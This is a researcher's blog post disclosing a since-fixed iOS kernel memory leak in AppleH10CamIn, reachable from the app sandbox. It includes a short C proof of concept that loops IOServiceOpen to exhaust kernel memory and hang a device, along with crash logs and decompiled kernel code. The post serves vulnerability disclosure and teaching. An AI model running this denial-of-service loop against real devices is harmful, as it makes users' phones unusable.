# Exhaust EL1 memory from the app sandbox

It's always important to keep up with the accessible IOServices exposed to userspace, specifically those that reachable from the app sandbox. At the time, [Brandon Azad](https://twitter.com/_bazad) triggered a very powerful type confusion vulnerability in *H11ANEIn*, simply by iterating over IOServices and trying to get userclients by brute-forcing on possible types ([blogpost](https://googleprojectzero.blogspot.com/2020/11/oops-i-missed-it-again.html), [issue 2004](https://bugs.chromium.org/p/project-zero/issues/detail?id=2004)).

I wrote a similar functionality and executed it from the app sandbox on iPhone X iOS14.2 (18B92). This got me a list of all the userclients I can open from inside the app sandbox, and I kept on with my research. However, I noticed a weird phenomenon: when I executed my scanner with a larger range of values for type (brute-forcing on possible type argument to *IOServiceOpen*), the device stopped responding completely and blacked in and out nonstop. I narrowed it down and built this minimal POC to trigger this behavior:

```c
void interesting_poc(void) {
    kern_return_t err;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    
    io_service_t io_service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleH10CamIn"));
        
    if (io_service == MACH_PORT_NULL) {
        perror("Failed to get service port\n");
        return;
    }

    printf("got service: 0x%x\n", io_service);
    
    for (size_t i = 0; i < 0x40000000; ++i) {
        err = IOServiceOpen(io_service, mach_task_self(), 2, &shared_user_client_conn);
        if(err == KERN_SUCCESS) {
            printf("got userclient with type == 0x%zx\n", i);
            return;
        }
    }
    printf("done\n");
    return;
}
```

The only way to get the device back on into a useable state was to do a hard reset. After the device turned back on, I saw crashdumps of many EL0 processes that occurred when the device was in an unstable/not responding state. Among those, there were interesting crashes (actually, a lot of crashes) of privileged processes in EL0 all over the place, and many non-interesting ones, such as NULL derefs, intentional SIGABRTs/kills, etc..

It was quite funny for me. My goal was to just get a list of accessible IOServices I can interact with from the app sandbox, so I could start reversing those and find vulnerabilities (TL;DR - more blogposts to come :P ). I didn't expect to trigger a bug by mistake. But clearly, once such a thing does happen, we can't ignore it :) So, I reversed the flow of *AppleH10CamInUserClient* creation (which is very short and straightforward) and found the bug in the binary. I wrote this (short) blogpost because it's a funny story to tell and I figured out it might be nice to share.

First, let me show two crashes from ReportCrash and DTServiceHub:

ReportCrash:

```
Hardware Model:      iPhone10,3
Process:             ReportCrash [337]
Path:                /System/Library/CoreServices/ReportCrash
Identifier:          ReportCrash
Version:             ???
Code Type:           ARM-64 (Native)
Role:                Unspecified
Parent Process:      launchd [1]
Coalition:           com.apple.ReportCrash [471]


Date/Time:           2021-01-17 09:05:55.0032 +0200
Launch Time:         2021-01-17 09:05:44.5058 +0200
OS Version:          iPhone OS 14.2 (18B92)
Release Type:        User
Baseband Version:    6.02.01
Report Version:      104

Exception Type:  EXC_BAD_ACCESS (SIGBUS)
Exception Subtype: KERN_MEMORY_ERROR at 0x000000011da4bef0 FS pagein error: 6 Device not configured
VM Region Info: 0x11da4bef0 is not in any region.  
      REGION TYPE                 START - END      [ VSIZE] PRT/MAX SHRMOD  REGION DETAIL
      UNUSED SPACE AT START
--->  
      UNUSED SPACE AT END

Termination Signal: Bus error: 10
Termination Reason: Namespace SIGNAL, Code 0xa
Terminating Process: exc handler [337]
Triggered by Thread:  3

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0:
0   libsystem_kernel.dylib        	0x00000001d9621bf0 0x1d95fa000 + 162800
1   libsystem_c.dylib             	0x00000001b72026d4 0x1b7192000 + 460500
2   libsystem_c.dylib             	0x00000001b72024d4 0x1b7192000 + 459988
3   ReportCrash                   	0x0000000104a2c064 0x104a1c000 + 65636
4   libdyld.dylib                 	0x00000001ae1b1588 0x1ae1b0000 + 5512

Thread 1:
0   libsystem_pthread.dylib       	0x00000001f4b6986c 0x1f4b5b000 + 59500

Thread 2:
0   libsystem_pthread.dylib       	0x00000001f4b6986c 0x1f4b5b000 + 59500

Thread 3 Crashed:
0   CoreSymbolication             	0x00000001cda8a5e4 0x1cda05000 + 546276
1   CoreSymbolication             	0x00000001cda8a2fc 0x1cda05000 + 545532
2   CoreSymbolication             	0x00000001cda8a2fc 0x1cda05000 + 545532
3   CoreSymbolication             	0x00000001cda84b18 0x1cda05000 + 523032
4   libdyld.dylib                 	0x00000001ae1b85b8 0x1ae1b0000 + 34232
5   CoreSymbolication             	0x00000001cda848f4 0x1cda05000 + 522484
6   CoreSymbolication             	0x00000001cda899b4 0x1cda05000 + 543156
7   CoreSymbolication             	0x00000001cda8b3a0 0x1cda05000 + 549792
8   Symbolication                 	0x00000001c2a1dba4 0x1c29ee000 + 195492
9   Symbolication                 	0x00000001c2a1e7c4 0x1c29ee000 + 198596
10  ReportCrash                   	0x0000000104a22d28 0x104a1c000 + 27944
11  ReportCrash                   	0x0000000104a20188 0x104a1c000 + 16776
12  ReportCrash                   	0x0000000104a211e8 0x104a1c000 + 20968
13  ReportCrash                   	0x0000000104a2b6dc 0x104a1c000 + 63196
14  ReportCrash                   	0x0000000104a2d3d8 0x104a1c000 + 70616
15  ReportCrash                   	0x0000000104a2d470 0x104a1c000 + 70768
16  libsystem_kernel.dylib        	0x00000001d95fe05c 0x1d95fa000 + 16476
17  ReportCrash                   	0x0000000104a2a7f4 0x104a1c000 + 59380
18  libsystem_pthread.dylib       	0x00000001f4b64b3c 0x1f4b5b000 + 39740
19  libsystem_pthread.dylib       	0x00000001f4b69880 0x1f4b5b000 + 59520

Thread 4:
0   libsystem_pthread.dylib       	0x00000001f4b6986c 0x1f4b5b000 + 59500

Thread 5:
0   libsystem_kernel.dylib        	0x00000001d95fe644 0x1d95fa000 + 17988
1   libsystem_kernel.dylib        	0x00000001d95fda48 0x1d95fa000 + 14920

Thread 6:
0   libsystem_kernel.dylib        	0x00000001d95fe644 0x1d95fa000 + 17988
1   libsystem_kernel.dylib        	0x00000001d95fda48 0x1d95fa000 + 14920

Thread 3 crashed with ARM Thread State (64-bit):
    x0: 0x0000000104f6d320   x1: 0x0000000000000d1f   x2: 0x0000000000000110   x3: 0x0000000000000738
    x4: 0x0000000000000000   x5: 0x0000000000000000   x6: 0x0000000000000110   x7: 0x000000011da4bef0
    x8: 0x0000000106809a00   x9: 0x000000010680a138  x10: 0x0000000000000110  x11: 0x000000011da4c000
   x12: 0x00000000000d4000  x13: 0x0000000102a38000  x14: 0x0000000000000000  x15: 0x0000000104f6ed40
   x16: 0x0000000102964000  x17: 0xffffffffffffffff  x18: 0x0000000000000000  x19: 0x0000000104f6d320
   x20: 0x0000000104f6d320  x21: 0x0000000102a37ef0  x22: 0x000000011da4bef0  x23: 0x0000000000000110
   x24: 0x0000000000000001  x25: 0x00000000000d4000  x26: 0x000000011d8c4000  x27: 0x000000016b60cdd0
   x28: 0x0000000000000738   fp: 0x000000016b60c5d0   lr: 0x00000001cda8a2fc
    sp: 0x000000016b60c5c0   pc: 0x00000001cda8a5e4 cpsr: 0x20000000
   esr: 0x92000007 (Data Abort) byte read Translation fault

Binary Images:
…
```

And DTServiceHub (check out the PC register):

```
Hardware Model:      iPhone10,3
Process:             DTServiceHub [278]
Path:                /Developer/Library/PrivateFrameworks/DVTInstrumentsFoundation.framework/DTServiceHub
Identifier:          DTServiceHub
Version:             ???
Code Type:           ARM-64 (Native)
Role:                Unspecified
Parent Process:      launchd [1]
Coalition:           com.apple.instruments.deviceservice [460]


Date/Time:           2021-01-17 08:53:59.0972 +0200
Launch Time:         2021-01-17 08:53:42.9602 +0200
OS Version:          iPhone OS 14.2 (18B92)
Release Type:        User
Baseband Version:    6.02.01
Report Version:      104

Exception Type:  EXC_BAD_ACCESS (SIGBUS)
Exception Subtype: KERN_MEMORY_ERROR at 0x0000000102b0d354
Termination Signal: Bus error: 10
Termination Reason: Namespace SIGNAL, Code 0xa
Terminating Process: exc handler [278]
Highlighted by Thread:  0

Backtrace not available

Unknown thread crashed with ARM Thread State (64-bit):
    x0: 0x0000000109e045e0   x1: 0x0000000102b31c56   x2: 0x000000016d94e888   x3: 0x0000000109e073c0
    x4: 0x0000000109e07440   x5: 0x0000000109e04a80   x6: 0x0000000109e073c0   x7: 0x0000000000000000
    x8: 0x000021a102b53d05   x9: 0x0000000000000000  x10: 0x0000000000000000  x11: 0x0000000109e04618
   x12: 0x0000000000000000  x13: 0x0000000000000000  x14: 0x000000001fba2a71  x15: 0x000000000000ca8e
   x16: 0x0000000102b53d02  x17: 0x0000000102b0d354  x18: 0x0000000000000000  x19: 0x0000000109e073c0
   x20: 0x000000016d94e888  x21: 0x0000000102b53d28  x22: 0x00000001d9e71440  x23: 0x0000000000000000
   x24: 0x0000000000000114  x25: 0x000000016d94f0e0  x26: 0x0000000102f03180  x27: 0x0000000000000000
   x28: 0x0000000000000000   fp: 0x000000016d94e870   lr: 0x0000000102b0acf0
    sp: 0x000000016d94e850   pc: 0x0000000102b0d354 cpsr: 0x40000000
   esr: 0x00000000  Address size fault

Binary images description not available

Error Formulating Crash Report:
Failed to create CSSymbolicatorRef - corpse still valid ¯\_(ツ)_/¯

EOF
```

So, what's going on here? My first instinct was that some functionality is triggered when I try to open *AppleH10CamInUserClient* (such as sandbox checks, etc.), which doesn't free some kernel allocations. By repeating calling *IOServiceOpen*, we exhaust the kernel memory, and the device gets into an unstable state. Actually, by taking a look at dmesg, we can see many traces about the memorystatus and processes being killed:

```
[  328.770593]: 328.762 memorystatus: killing_top_process pid 41 [backboardd] (zone-map-exhaustion 17) 34416KB - memorystatus_available_pages: 83242328.774 memorystatus: killing_top_process pid 1965 [dasd] (zone-map-exhaustion 1) 960KB - memorystatus_available_pages: 83223328.777 memorystatus: killing_top_process pid 1967 [chronod] (zone-map-exhaustion 1) 1072KB - memorystatus_available_pages: 83255328.780 memorystatus: killing_top_process pid 1969 [awdd] (zone-map-exhaustion 1) 880KB - memorystatus_available_pages: 83193328.781 memorystatus: killing_top_process pid 1972 [findmydeviced] (zone-map-exhaustion 1) 1024KB - memorystatus_available_pages: 83259328.784 memorystatus: killing_top_process pid 1973 [securityd] (zone-map-exhaustion 1) 1184KB - memorystatus_available_pages: 83351328.786 memorystatus: killing_top_process pid 1974 [dmd] (zone-map-exhaustion 1) 1072KB - memorystatus_available_pages: 83318328.786 memorystatus: killing_top_process pid 1975 [SpringBoard] (zone-map-exhaustion 16) 1680KB - memorystatus_available_pages: 83188328.787 memorystatus: killing_top_process pid 1976 [backboardd] (zone-map-exhaustion 17) 80KB - memorystatus_available_pages: 83195328.787 memorystatus: killing_top_process pid 46 [fseventsd] (zone-map-exhaustion 18) 2304KB - memorystatus_available_pages: 83387328.790 memorystatus: killing_top_process pid 1977 [dasd] (zone-map-exhaustion 14) 624KB - memorystatus_available_pages: 83313328.790 memorystatus: killing_top_process pid 72 [watchdogd] (zone-map-exhaustion 18) 1392KB - memorystatus_available_pages: 83448328.791 memorystatus: killing_top_process pid 1979 [awdd] (zone-map-exhaustion 14) 80KB - memorystatus_available_pages: 83457328.791 memorystatus: killing_top_process pid 70 [thermalmonitord] (zone-map-exhaustion 18) 2608KB - memorystatus_available_pages: 83790328.808 memorystatus: killing_top_process pid 1980 [findmydeviced] (zone-map-exhaustion 1) 1280KB - memorystatus_available_pages: 83492328.819 memorystatus: killing_top_process pid 1982 [securityd] (zone-map-exhaustion 1) 1600KB - memorystatus_available_pages: 84300AppleSPUHIDDevice:0x100000503 close by AppleSPUHIDDeviceUserClient 0x1000005f5 (0x0)
```

But this doesn't make sense to me -- if we indeed exhausted the system memory, why these daemons (ReportCrash, DTServiceHub, mediaserverd, etc.) crash in interesting ways (EXC_BAD_ACCESS, but not on NULL derefs)? I would understand/expect NULL derefs, but EXC_BAD_ACCESS on mappable addresses? No, there must be something else involved. I pinged [Luca](https://twitter.com/qwertyoruiopz) (the one and only! Love you man! :) ). He immediately suggested that what I'm experiencing here are just memory management failures in the kernel, as a consequence of the memory exhaustion. Makes sense and explains what we see here.

It's also important to note that most of the EXC_BAD_ACCESS here (the interesting ones on mappable addresses, not NULL derefs) are not segfaults (SIGSEGV, signal 11); they are SIGBUSes (bus errors, signal 10). That's the reason I insist on saying "EXC_BAD_ACCESS" (the XNU high-level error) instead of simply say "segfault" because this inaccuracy is highly important. The fact we are experiencing here SIGBUSes and not segfaults suggests that those crashes are **not exploitable**. I did get one segfault in mediaserverd on iOS14.2 (18B92), but it did not repro again on iOS14.4, so no point in discussing this.

Now, let's get to the interesting questions:

- Where is the vulnerability?
- What can we do with it?

## The vulnerability

Personally, I do not like to repeat stuff that is highly documented and common knowledge. Therefore I won't explain here what IOKit is, how it was designed and how it works. There are lots of great resources about it ([one](https://s.siguza.net/dl/pdf/2018-Zer0Con.pdf), [two](https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-1.html), [three](http://homes.sice.indiana.edu/luyixing/bib/CCS20-iDEA.pdf), etc.). However, I'll do a short reminder about what happens when a userspace process tries to interact with a kernel driver through its userclient:

0. First, we need to obtain a handle to an instance of the driver we want to interact with. This is done through the *IOServiceGetMatchingService* API.
1. Using this handle, the userspace process obtains another handle to the userclient instance of the driver. This is done using the API call _IOServiceOpen_, which triggers a call to the relevant kernel function *newUserClient*.
2. At this point, the userspace process can interact with the driver to call its exposed external methods, map memory and more. This is done using more IOKit APIs (*IOConnectCallMethod, IOConnectCallAsyncMethod, IOConnectMapMemory, IOConnectMapMemory64, IOConnectSetCFProperty, IOServiceClose*, etc.).

Clearly, we can't obtain a userclient to *AppleH10CamIn* from the app sandbox, as we don't have the required entitlements for that (which is unfortunate because the attack surface exposed by the external methods there is quite large :P). But that's the beauty here -- the vulnerability exists in a control flow that executes every time we call *IOServiceOpen*, regardless if the sandbox checks passed or not. We can trigger this bug without actually obtaining *AppleH10CamInUserClient*. And this is the main reason I decided to write this short blogpost. After all, the vulnerability is not interesting, and it's not useful (we have many ways to trigger persistent EL1 allocations from the app sandbox). There are much better bugs. But I liked the fact that the vulnerable flow here executes at the phase of the sandbox checks and therefore is triggerable from the app sandbox.

Side note: This is not related to this bug at all, but if you need to read more about entitlements, I highly recommend you to check out this great blog [Psychic Paper](https://siguza.github.io/psychicpaper/) by [Siguza](https://twitter.com/s1guza). In this blog, Siguza presented an OUTSTANDING sandbox escape vulnerability, probably the most elegant I've ever seen. Seriously, kudos!

Now, let's see the bug. It was very easy to find it in the binary, as the functionality involved here is very straightforward. Every time we call *IOServiceOpen* from userspace, the corresponding *newUserClient* kernel function is triggered. In our case, this is the function *AppleH10CamIn::newUserClient*:

```c++
__int64 __fastcall AppleH10CamIn::newUserClient(AppleH10CamIn *this, task *a2, void *a3, unsigned int a4, IOUserClient **pConn)
{
  __int64 v_retval; // x19
  IOUserClient *v_client; // x21

  v_retval = 0xE00002C9LL;
  *pConn = 0LL;
  v_client = (*(AppleH10CamInUserClient::gMetaClass + 0x68))();
  // +0x5d0 - AppleH10CamInUserClient::init()
  // +0x360 - IOService::attach(IOService*)
  if ( (*(*v_client + 0x5D0LL))() && (*(*v_client + 0x360LL))(v_client, this) )
  {
    if ( (*(*v_client + 0x2B0LL))(v_client, this) )// AppleH10CamInUserClient::start
    {
      v_retval = 0LL;
      *pConn = v_client;
    }
    else
    {
      (*(*v_client + 0x368LL))(v_client, this); // IOService::detach
      (*(*v_client + 0x28LL))(v_client);        // OSObject::release
    }
  }
  return v_retval;
}
```

As we can see, the function *AppleH10CamInUserClient::init* is called on the beginning, and its return value is checked to see if we can proceed. We can see we are correct using dmesg, as this function has very clear and informative traces via *IOLog*. Here is the function:

```c++
__int64 __fastcall AppleH10CamInUserClient::init(AppleH10CamInUserClient *this, task *task, OSDictionary *dict)
{
  __int64 v_proc; // x0
  const char *v7; // x2
  __int64 v_osObj; // x0 MAPDST
  __int64 v_gOSBolleanTrue; // x23
  __int64 v_retval; // x21
  char v_isMediaserverd; // w8

  *(this + 0x1D) = task;
  *(this + 0x38) = 0;
  *(this + 0xF1) = 0;
  v_proc = get_bsdtask_info(task);
  *(this + 0x3D) = proc_pid(v_proc);
  bzero(this + 0xF8, 0x80uLL);
  proc_name(*(this + 0x3D), this + 0xF8, 0x80u);
  v_osObj = IOUserClient::copyClientEntitlement(task, "com.apple.camera.iokit-user-access", v7);
  // +0x28 - OSObject::release
  if ( v_osObj && (v_gOSBolleanTrue = gOSBooleanTrue, (*(*v_osObj + 0x28LL))(), v_osObj == v_gOSBolleanTrue) )
  {
    v_retval = IOUserClient::init(this, dict);
    _os_log_internal(
      &_mh_execute_header,
      &_os_log_default,
      0LL,
      "AppleH10CamInUserClient::%s - New UserClient for process: %s (pid %d)\n",
      "init",
      this + 0xF8,
      *(this + 61));
  }
  else
  {
    _os_log_internal(
      &_mh_execute_header,
      &_os_log_default,
      0LL,
      "AppleH10CamInUserClient::%s - Process %s (pid %d) denied access \n",
      "init",
      this + 0xF8,
      *(this + 61));
    v_retval = 0LL;
  }
  if ( !strncmp(this + 0xF8, "h10isp", 0x80uLL) )
  {
    _os_log_internal(
      &_mh_execute_header,
      &_os_log_default,
      0LL,
      "AppleH10CamInUserClient::%s - Client is h10isp test app\n",
      "init");
    *(this + 241) = 1;
  }
  if ( !strncmp(this + 0xF8, "mediaserverd", 0x80uLL) )
  {
    _os_log_internal(
      &_mh_execute_header,
      &_os_log_default,
      0LL,
      "AppleH10CamInUserClient::%s - Client is mediaserverd\n",
      "init");
    v_isMediaserverd = 1;
  }
  else
  {
    v_isMediaserverd = 0;
  }
  *(this + 240) = v_isMediaserverd;
  return v_retval;
}
```

And if we run our POC, we see this nice trace in dmesg:

```
[  404.227375]: AppleH10CamInUserClient::init - Process saaramar_poc (pid 1134) denied access 
[  404.227381]: AppleH10CamInUserClient::init - Process saaramar_poc (pid 1134) denied access 
[  404.227387]: AppleH10CamInUserClient::init - Process saaramar_poc (pid 1134) denied access 
[  404.227393]: AppleH10CamInUserClient::init - Process saaramar_poc (pid 1134) denied access 
[  404.227399]: AppleH10CamInUserClient::init - Process saaramar_poc (pid 1134) denied access 
```

Ok great. It's very clear that this function is the gatekeeper that keeps us from obtaining the *AppleH10CamInUserClient* (as it should) by checking if we have the *com.apple.camera.iokit-user-access* entitlement.

So, where is the issue? The issue is that when the function *AppleH10CamInUserClient::init* returns NULL (which is exactly what happens if we don't have the right entitlement), *AppleH10CamIn::newUserClient* misses the call to *OSObject::release*. As you can see in any other class' implementation of *::newUserClient*, the function has to call *OSObject::release* in all of its possible flows. And here we have a flow that clearly misses it. This means that every call to *IOServiceOpen* with an instance of *AppleH10CamIn* will miss the free of this allocation.

Unsurprisingly, the same behavior exists in *AppleH10PearlCam*. Therefore, the POC works with *AppleH10PearlCam* as well.

## The fix

I reported this to Apple on Jan 12, 2021, and the fix shipped at (May 24, 2021, in iOS 14.6). Please note this bug did NOT get a CVE, and it shouldn't. As I said before, this bug is not exploitable; therefore, it's not a security issue.

In the beginning, I didn't want to publish this blogpost because the bug is not exploitable (and as we all know, there are a lot of null derefs / DOS all over the iOS kernel). I decided to share it after all just because the story is pretty funny, and along the way, we can spread knowledge (which is fun and important).

This might be a good time to bring it up again -- [checkra1n](https://checkra.in) and [Corellium](https://twitter.com/corelliumhq) made iOS security research much more convenient and I want to give them the rightful shoutout and thank them for their great work. We can't say that on a lot of things, but these two projects are life-changers for the iOS security research community.

Thanks a lot to [Luca](https://twitter.com/qwertyoruiopz) and [Siguza](https://twitter.com/s1guza) for reviewing.

Saar Amar